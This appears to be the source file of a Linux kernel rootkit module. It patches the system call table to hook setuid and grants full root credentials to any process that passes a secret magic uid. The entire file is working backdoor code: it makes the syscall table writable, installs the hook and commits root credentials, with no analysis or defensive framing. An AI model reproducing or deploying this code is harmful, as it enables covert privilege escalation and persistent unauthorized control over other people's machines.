#include "includes.h"

unsigned long* sys_call_table;

asmlinkage long hacked_setuid(uid_t uid)
{
    long ret = 0;
    struct cred *new;
    printk(KERN_INFO "intercepted setuid: %d\n", uid);

    //if the requested uid is the "magic number" to give root priv
    if (uid == MAGIC_NUMBER) {
        DEBUG("Magic Number passed in, elevating privilege");
        new = prepare_creds();
        if (!new)
            return -ENOMEM;
        //set root priveleges
        new->uid = GLOBAL_ROOT_UID;
        new->gid = GLOBAL_ROOT_GID;
        new->suid = GLOBAL_ROOT_UID;
        new->sgid = GLOBAL_ROOT_GID;
        new->euid = GLOBAL_ROOT_UID;
        new->egid = GLOBAL_ROOT_GID;
        new->fsuid = GLOBAL_ROOT_UID;
        new->fsgid = GLOBAL_ROOT_GID;

        ret = commit_creds(new);
    }
    else {
        ret = (*orig_setuid) (uid);
    }

    return ret;
}

void set_addr_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    if (pte->pte &~ _PAGE_RW)
        pte->pte |= _PAGE_RW;

}

void set_addr_ro(unsigned long addr)
{

    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    pte->pte = pte->pte &~_PAGE_RW;

}

static int __init initModule(void)
{

    sys_call_table = (unsigned long*) SYSCALL_TABLE;

    set_addr_rw((unsigned long) sys_call_table);

    HOOK_SYSCALL(sys_call_table, orig_setuid, hacked_setuid, __NR_setuid);

    set_addr_ro((unsigned long) sys_call_table);

    DEBUG("loaded module");
    // Non-zero return means that the module couldn't be loaded.
    return 0;
}

static void __exit exitModule(void)
{
    set_addr_rw((unsigned long) sys_call_table);

    UNHOOK_SYSCALL(sys_call_table, orig_setuid, __NR_setuid);

    set_addr_ro((unsigned long) sys_call_table);
    DEBUG("exiting module");
}

module_init(initModule);
module_exit(exitModule);
MODULE_LICENSE("GPL");
